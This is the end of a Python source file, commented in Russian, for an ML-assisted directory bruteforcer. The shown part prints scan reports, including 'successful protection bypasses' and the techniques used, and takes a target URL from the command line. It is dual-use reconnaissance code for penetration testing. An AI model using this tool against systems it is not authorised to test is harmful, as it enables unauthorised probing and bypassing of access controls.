        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(output_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Результаты сохранены в {filename}")
    
    def print_summary(self, results: List[Dict[str, Any]], total_requests: int):
        """Вывод подробной сводки результатов"""
        print("\n" + "="*80)
        print("🔍 ДЕТАЛЬНЫЙ ОТЧЕТ ПО СКАНИРОВАНИЮ")
        print("="*80)
        
        # Классификация результатов
        successful_bypasses = [r for r in results if r.get('success', False)]
        interesting_paths = [r for r in results if r['status_code'] == 200]
        redirects = [r for r in results if r['status_code'] in [301, 302]]
        server_errors = [r for r in results if r['status_code'] in [500, 502, 503]]
        auth_issues = [r for r in results if r['status_code'] in [401, 403]]
        
        # Общая статистика
        print(f"\n📊 ОБЩАЯ СТАТИСТИКА:")
        print(f"   • Всего путей проверено: {len(results)}")
        print(f"   • Всего HTTP запросов: {total_requests}")
        print(f"   • Успешных обходов: {len(successful_bypasses)}")
        print(f"   • Доступных путей (200): {len(interesting_paths)}")
        print(f"   • Редиректов: {len(redirects)}")
        print(f"   • Серверных ошибок: {len(server_errors)}")
        print(f"   • Проблем с авторизацией: {len(auth_issues)}")
        
        # Успешные обходы защиты
        if successful_bypasses:
            print(f"\n🚨 УСПЕШНЫЕ ОБХОДЫ ЗАЩИТЫ ({len(successful_bypasses)}):")
            for i, result in enumerate(successful_bypasses[:20], 1):
                path = result['path']
                status = result['status_code']
                techniques = result.get('applied_techniques', [])
                anomaly = result.get('anomaly_type', 'UNKNOWN')
                
                print(f"\n   {i:2d}. 🎯 /{path}")
                print(f"       Статус: {status} | Аномалия: {anomaly}")
                print(f"       Техники: {', '.join(techniques[:4])}")
                if len(techniques) > 4:
                    print(f"       + еще {len(techniques) - 4} техник...")
                
                # Показываем детали запроса если есть
                if 'response_size' in result:
                    print(f"       Размер ответа: {result['response_size']} байт")
                if 'response_time' in result:
                    print(f"       Время ответа: {result['response_time']:.2f}с")
        
        # Интересные доступные пути
        if interesting_paths:
            print(f"\n📍 ДОСТУПНЫЕ ПУТИ (200 OK) - {len(interesting_paths)}:")
            for i, result in enumerate(interesting_paths[:15], 1):
                path = result['path']
                size = result.get('response_size', 0)
                time_ms = result.get('response_time', 0)
                
                print(f"   {i:2d}. 🟢 /{path}")
                if size > 0:
                    print(f"       Размер: {size} байт, Время: {time_ms:.2f}с")
                
                # Показываем если есть подозрительные заголовки
                if 'headers' in result:
                    suspicious_headers = []
                    headers = result['headers']
                    if 'server' in headers:
                        suspicious_headers.append(f"Server: {headers['server']}")
                    if 'x-powered-by' in headers:
                        suspicious_headers.append(f"X-Powered-By: {headers['x-powered-by']}")
                    if suspicious_headers:
                        print(f"       Заголовки: {', '.join(suspicious_headers)}")
        
        # Редиректы
        if redirects:
            print(f"\n🔄 РЕДИРЕКТЫ ({len(redirects)}):")
            for i, result in enumerate(redirects[:10], 1):
                path = result['path']
                status = result['status_code']
                location = result.get('headers', {}).get('location', 'неизвестно')
                print(f"   {i:2d}. 🟡 /{path} [{status}] -> {location}")
        
        # Серверные ошибки
        if server_errors:
            print(f"\n⚠️  СЕРВЕРНЫЕ ОШИБКИ ({len(server_errors)}):")
            for i, result in enumerate(server_errors[:10], 1):
                path = result['path']
                status = result['status_code']
                techniques = result.get('applied_techniques', [])
                print(f"   {i:2d}. 🔴 /{path} [{status}]")
                if techniques:
                    print(f"       Применены техники: {', '.join(techniques[:3])}")
        
        # Проблемы с авторизацией
        if auth_issues:
            print(f"\n🔐 ПРОБЛЕМЫ С АВТОРИЗАЦИЕЙ ({len(auth_issues)}):")
            for i, result in enumerate(auth_issues[:10], 1):
                path = result['path']
                status = result['status_code']
                auth_header = 'WWW-Authenticate' in result.get('headers', {})
                print(f"   {i:2d}. 🟠 /{path} [{status}]")
                if auth_header:
                    print(f"       Требуется аутентификация")
        
        # Статистика по техникам
        technique_counts = {}
        for result in results:
            for technique in result.get('applied_techniques', []):
                technique_counts[technique] = technique_counts.get(technique, 0) + 1
        
        if technique_counts:
            print(f"\n🛠️  СТАТИСТИКА ПО ТЕХНИКАМ:")
            sorted_techniques = sorted(technique_counts.items(), key=lambda x: x[1], reverse=True)
            for technique, count in sorted_techniques[:10]:
                print(f"   • {technique}: {count} применений")
        
        # Рекомендации
        print(f"\n💡 РЕКОМЕНДАЦИИ:")
        if successful_bypasses:
            print("   🔧 Найдены успешные обходы - требуется немедленное исправление!")
            print("   📋 Проверьте конфигурацию веб-сервера и WAF")
        
        if len(interesting_paths) > 10:
            print("   🔍 Много доступных путей - проверьте на чувствительную информацию")
        
        if server_errors:
            print("   ⚡ Серверные ошибки могут указывать на проблемы конфигурации")
        
        print("\n" + "="*80)
        print("🎯 Сканирование завершено!")
        print("="*80)


def main():
    """Основная функция"""
    parser = argparse.ArgumentParser(description='Smart Directory Bruteforce with TapTransformer')
    parser.add_argument('url', help='Базовый URL для сканирования')
    parser.add_argument('--wordlist', default='wordlists.txt', help='Файл со словарем путей')
    parser.add_argument('--model', default='best_model.pth', help='Файл с моделью')
    parser.add_argument('--encoders', default='encoders.pkl', help='Файл с энкодерами')
    parser.add_argument('--threads', type=int, default=10, help='Количество потоков')
    parser.add_argument('--delay', type=float, default=0.1, help='Задержка между запросами (сек)')
    parser.add_argument('--timeout', type=int, default=10, help='Таймаут запроса (сек)')
    parser.add_argument('--max-paths', type=int, help='Максимальное количество путей для сканирования')
    parser.add_argument('--output', default='scan_results.json', help='Файл для сохранения результатов')
    
    args = parser.parse_args()
    
    # Проверка URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    # Создание брутфорсера
    bruteforcer = SmartBruteforcer(
        model_path=args.model,
        encoders_path=args.encoders,
        wordlist_path=args.wordlist,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout
    )
    
    try:
        # Запуск сканирования
        results = bruteforcer.run_scan(args.url, args.max_paths)
        
        # Сохранение результатов
        bruteforcer.save_results(results, args.output)
        
        # Конвертация результатов в словари для отчета
        results_dict = []
        for result in results:
            results_dict.append({
                'path': result.path,
                'status_code': result.status_code,
                'response_time': result.response_time,
                'response_size': result.content_length,
                'headers': result.headers,
                'applied_techniques': result.applied_techniques or [],
                'success': result.success,
                'anomaly_type': result.anomaly_type
            })
        
        # Вывод сводки
        bruteforcer.print_summary(results_dict, bruteforcer.stats['total_requests'])
        
    except KeyboardInterrupt:
        logger.info("Сканирование прервано пользователем")
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")


if __name__ == '__main__':
    main() 